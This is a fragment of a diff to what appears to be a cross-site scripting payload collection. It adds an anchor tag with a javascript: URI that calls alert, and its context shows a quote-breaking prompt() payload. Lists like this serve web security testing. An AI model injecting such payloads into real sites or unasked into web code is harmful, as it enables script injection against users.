@@ -15,6 +15,10 @@ XSS with %0d
 </Button>
 ```
 
+**A tag**
+```
+<a href="javascript:alert(0)">click here</a>
+```
 
 ```
 "-prompt(8)-"
